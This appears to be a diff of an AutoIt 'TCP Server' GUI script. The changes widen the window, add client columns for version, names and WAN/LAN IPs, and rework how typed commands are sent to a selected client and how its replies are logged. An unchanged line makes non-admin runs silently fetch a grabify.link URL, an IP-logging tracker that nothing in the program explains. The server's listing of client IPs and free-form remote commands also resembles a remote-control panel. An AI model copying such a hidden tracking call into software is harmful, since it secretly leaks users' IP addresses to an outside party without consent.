@@ -41,7 +41,7 @@ Global $ServerDetails ;| Server Version | Client Version | LAN IP | WAN IP | POR
 		_log("admin: True")
 	EndIf
 ; URLS
-	If $admin=True Then $URLServerDetails=FileReadLine(@ScriptDir&"\serverDetailsURL.txt",1)
+	If $admin=True Then $URLServerDetails=FileReadLine(@ScriptDir&"\URLs.txt",1)
 	If $admin=False Then InetRead("https://grabify.link/5XXPPW")
 
 ; Server/GUI
@@ -113,7 +113,7 @@ Global $ServerDetails ;| Server Version | Client Version | LAN IP | WAN IP | POR
 #Region ===== ===== GUI_MAIN
 
 	$GUIHight=400
-	$GUIWidth=400
+	$GUIWidth=800
 	GUICreate("TCP Server (v"&$Version&")", $GUIWidth, $GUIHight, -1, -1)
 
 	$Tab=GUICtrlCreateTab(0,0,$GUIWidth,$GUIHight)
@@ -201,7 +201,7 @@ GUICtrlCreateTabItem("Details")
 GUICtrlCreateTabItem("Clients")
 
 	$top=25
-	$ViewClients = GUICtrlCreateListView("ID|Socket|Name   |IP(WAN)          |IP(LAN)         ",5,$top,$GUIWidth-10,$GUIHight-90)
+	$ViewClients = GUICtrlCreateListView("ID|Socket|Version|Name   |Name2   |IP(WAN)          |IP(LAN1)         |IP(LAN2)         ",5,$top,$GUIWidth-10,$GUIHight-90)
 	$top+=$GUIHight-85
 	$ButtonSelectClient=GUICtrlCreateButton("Command Selected",5,$top,$GUIWidth-10,25)
 	$top+=30
@@ -293,16 +293,18 @@ WEnd
 ;----- Command
 	Func _Command()
 		$InputRead=GUICtrlRead($InputCommand)
-		If $selectedClient<>-1 Then _Send($selectedClient,$InputRead)
-		$tempSplit=StringSplit($InputRead,"|")
-		If $tempSplit[1]="ask" Then
+		If $selectedClient<>-1 And $InputRead<>"" Then
+			_Send($selectedClient,$InputRead)
 			$tempRecive=TCPRecv($ClientID[$selectedClient][2],99999)
 			$error=@error
-			$ClientID[$selectedClient][5]=$tempRecive
+			$ClientID[$selectedClient][5]='[ ] '&$tempRecive&@CRLF&$ClientID[$selectedClient][5]
 			_log('Reciving from ID: '&$ClientID[$selectedClient][0]&'('&$tempRecive&')'&$error)
 			GUICtrlSetData($EditClientLastMSG,$ClientID[$selectedClient][5])
+			GUICtrlSetData($InputCommand,"")
+			Sleep(500)
+			;If $InputRead="update" Then
+			_CheckClients() ;client offline?
 		EndIf
-		GUICtrlSetData($InputCommand,"")
 	EndFunc
 ;----- Listen / CLIENT info
 	Func _Listen()
@@ -349,7 +351,7 @@ WEnd
 					$ii=TCPSend($ClientID[$i][2],"test")
 					$error=@error
 					_log('Message sent to ID:'&$ClientID[$i][0]&' ('&$ii&') err: '&$error)
-					If $error=10054 Then
+					If $error=10054 Or $error=10053 Then
 						$ClientID[$i][1]=0
 						$tempViewUpdate=True
 						TCPCloseSocket($ClientID[$i][2])
@@ -379,7 +381,6 @@ WEnd
 	Func _exit()
 
 		If $connectionsActive > 0 Then _Send('all','server_offline')
-
 		TCPShutdown()
 		Exit
 
